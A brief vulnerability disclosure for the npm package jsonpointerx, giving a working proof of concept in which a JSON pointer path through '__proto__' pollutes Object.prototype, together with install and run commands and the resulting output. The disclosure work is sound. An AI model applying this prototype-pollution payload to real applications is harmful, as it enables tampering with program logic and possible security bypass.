# Description

`jsonpointerx` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var {JsonPointer} =require('jsonpointerx');
let obj = { };
let jp = JsonPointer.compile('/__proto__/polluted'); 
console.log("Before : " + {}.polluted);
jp.set(obj, 'Yes! Its Polluted'); 
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i jsonpointerx # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
